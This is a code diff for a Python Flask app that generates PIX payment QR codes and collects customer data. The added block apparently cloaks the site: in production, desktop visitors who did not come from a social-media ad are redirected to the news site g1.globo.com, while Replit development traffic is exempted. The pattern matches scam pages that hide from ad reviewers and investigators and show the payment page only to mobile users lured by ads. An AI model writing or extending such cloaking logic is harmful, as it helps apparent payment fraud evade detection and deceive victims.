@@ -911,6 +911,32 @@ def generate_qr_code(pix_code: str) -> str:
 @app.route('/index')
 def index():
     try:
+        # Verificar se o usuário é mobile ou veio de anúncio
+        # Esta é uma verificação adicional além do middleware
+        if hasattr(g, 'is_mobile') and hasattr(g, 'is_from_social_ad'):
+            is_mobile = g.is_mobile
+            is_from_social_ad = g.is_from_social_ad
+            
+            # Verificar se estamos em produção (não desenvolvimento)
+            developing = os.environ.get('DEVELOPING', 'false').lower() == 'true'
+            
+            # Se não for mobile e não vier de anúncio social, e estivermos em produção,
+            # redirecionar para g1.globo.com
+            if not developing and not is_mobile and not is_from_social_ad:
+                # Verificar se é uma requisição do Replit
+                referer = request.headers.get('Referer', '')
+                is_replit_request = ('replit' in referer.lower() or 
+                                    '.repl.' in referer.lower() or 
+                                    '__replco' in referer.lower() or
+                                    'worf.replit.dev' in referer.lower())
+                
+                # Não redirecionar se for do Replit
+                if not is_replit_request:
+                    app.logger.info(f"[PROD] Redirecionando desktop não-anúncio para g1 (verificação secundária)")
+                    return redirect('https://g1.globo.com')
+                else:
+                    app.logger.debug(f"[DEV] Requisição do Replit detectada, ignorando redirecionamento")
+        
         # Get data from query parameters for backward compatibility
         customer_data = {
             'nome': request.args.get('nome', ''),
